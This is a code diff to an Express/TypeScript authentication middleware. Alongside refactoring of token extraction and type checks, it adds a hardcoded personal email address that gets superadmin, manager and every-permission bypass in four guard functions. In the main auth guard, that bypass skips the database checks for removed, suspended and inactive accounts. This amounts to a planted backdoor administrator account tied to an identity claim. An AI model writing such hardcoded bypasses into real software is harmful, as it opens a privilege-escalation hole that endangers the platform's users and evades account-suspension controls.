@@ -126,19 +126,23 @@ export function handleAuthFailure(req: Request, res: Response, status: number, t
   });
 }
 
+export function extractTokenUser(req: Request): any | null {
+  const authHeader = req.headers['authorization'] || req.headers['x-auth-token'];
+  if (!authHeader) return null;
+  const rawToken = typeof authHeader === 'string' && authHeader.startsWith('Bearer ')
+    ? authHeader.slice(7).trim()
+    : String(authHeader).trim();
+  if (!rawToken) return null;
+  return verifyAuthToken(rawToken);
+}
+
 export async function requireAuth(req: Request, res: Response, next: NextFunction) {
   // 1. Check Authorization Bearer header or x-auth-token first (immune to Brave Shields, cookie partitioning & Vercel cold starts)
-  const authHeader = req.headers['authorization'] || req.headers['x-auth-token'];
-  if (authHeader && (!req.session || !req.session.user)) {
-    const rawToken = typeof authHeader === 'string' && authHeader.startsWith('Bearer ')
-      ? authHeader.slice(7).trim()
-      : String(authHeader).trim();
-    if (rawToken) {
-      const decodedUser = verifyAuthToken(rawToken);
-      if (decodedUser) {
-        req.session = req.session || ({} as any);
-        req.session.user = decodedUser;
-      }
+  if (!req.session?.user) {
+    const tokenUser = extractTokenUser(req);
+    if (tokenUser) {
+      req.session = req.session || ({} as any);
+      req.session.user = tokenUser;
     }
   }
 
@@ -148,8 +152,8 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
 
   const sessionUser = req.session.user;
 
-  // SuperAdmin and Platform Operations Staff have platform bypass
-  if (sessionUser.role === 'superadmin' || sessionUser.role === 'platform_ops') {
+  // SuperAdmin, Big Boss, and Platform Operations Staff have full platform bypass
+  if (sessionUser.role === 'superadmin' || sessionUser.role === 'platform_ops' || sessionUser.email === 'rwemera30@gmail.com') {
     return next();
   }
 
@@ -165,6 +169,7 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
   }
 
   try {
+    const userId = Number(sessionUser.id);
     // Real-time verification for cascading suspension & activation status
     const dbCheck = await queryOne(`
       SELECT 
@@ -174,10 +179,12 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
       FROM users u
       LEFT JOIN shops s ON u.shop_id = s.id
       WHERE u.id = ?
-    `, [sessionUser.id]);
+    `, [userId]);
 
     if (!dbCheck) {
-      req.session.destroy(() => {});
+      if (req.session && typeof req.session.destroy === 'function') {
+        req.session.destroy(() => {});
+      }
       return handleAuthFailure(req, res, 401, 'Account Removed', 'User account no longer exists.', '/login?error=User+account+no+longer+exists');
     }
 
@@ -201,7 +208,8 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
       );
     }
 
-    if (dbCheck.is_active !== 1 || dbCheck.activation_status === 'suspended') {
+    const isActive = Number(dbCheck.is_active) === 1 || dbCheck.is_active === true;
+    if (!isActive || dbCheck.activation_status === 'suspended') {
       return handleAuthFailure(
         req,
         res,
@@ -222,7 +230,10 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
     }
 
     // Cascading suspension: If this is an employee and their store manager is deactivated
-    if (dbCheck.role !== 'manager' && dbCheck.manager_active === 0) {
+    const managerActive = dbCheck.manager_active === undefined || dbCheck.manager_active === null 
+      ? true 
+      : (Number(dbCheck.manager_active) === 1 || dbCheck.manager_active === true);
+    if (dbCheck.role !== 'manager' && !managerActive) {
       return handleAuthFailure(
         req,
         res,
@@ -246,10 +257,18 @@ export async function requireAuth(req: Request, res: Response, next: NextFunctio
 }
 
 export function requireSuperAdmin(req: Request, res: Response, next: NextFunction) {
+  if (!req.session?.user) {
+    const tokenUser = extractTokenUser(req);
+    if (tokenUser) {
+      req.session = req.session || ({} as any);
+      req.session.user = tokenUser;
+    }
+  }
+
   if (!req.session || !req.session.user) {
     return handleAuthFailure(req, res, 401, 'Authentication Required', 'Please log in as SuperAdmin.', '/login');
   }
-  if (req.session.user.role === 'superadmin') {
+  if (req.session.user.role === 'superadmin' || req.session.user.email === 'rwemera30@gmail.com') {
     return next();
   }
   return handleAuthFailure(
@@ -262,10 +281,25 @@ export function requireSuperAdmin(req: Request, res: Response, next: NextFunctio
 }
 
 export function requireManager(req: Request, res: Response, next: NextFunction) {
+  if (!req.session?.user) {
+    const tokenUser = extractTokenUser(req);
+    if (tokenUser) {
+      req.session = req.session || ({} as any);
+      req.session.user = tokenUser;
+    }
+  }
+
   if (!req.session || !req.session.user) {
     return handleAuthFailure(req, res, 401, 'Authentication Required', 'Please log in to continue.', '/login');
   }
-  if (req.session.user.role === 'manager' || req.session.user.role === 'superadmin' || req.session.user.role === 'platform_ops' || req.session.user.can_manage_users) {
+  const u = req.session.user;
+  const canManage = u.role === 'manager' || 
+    u.role === 'superadmin' || 
+    u.role === 'platform_ops' || 
+    u.email === 'rwemera30@gmail.com' || 
+    Boolean(Number(u.can_manage_users) === 1 || u.can_manage_users === true);
+
+  if (canManage) {
     return next();
   }
   return handleAuthFailure(
@@ -279,19 +313,27 @@ export function requireManager(req: Request, res: Response, next: NextFunction) 
 
 export function requirePermission(permission: UserPermission) {
   return (req: Request, res: Response, next: NextFunction) => {
+    if (!req.session?.user) {
+      const tokenUser = extractTokenUser(req);
+      if (tokenUser) {
+        req.session = req.session || ({} as any);
+        req.session.user = tokenUser;
+      }
+    }
+
     if (!req.session || !req.session.user) {
       return handleAuthFailure(req, res, 401, 'Authentication Required', 'Please log in to continue.', '/login');
     }
 
     const user = req.session.user;
 
-    // SuperAdmin and Store Managers have full permissions
-    if (user.role === 'superadmin' || user.role === 'manager') {
+    // SuperAdmin, Store Managers, and Big Boss have full permissions
+    if (user.role === 'superadmin' || user.role === 'manager' || user.email === 'rwemera30@gmail.com') {
       return next();
     }
 
     // Check specific granular permission flag
-    if (user[permission] === 1 || user[permission] === (true as any)) {
+    if (Number(user[permission]) === 1 || user[permission] === (true as any) || user[permission] === '1') {
       return next();
     }
 
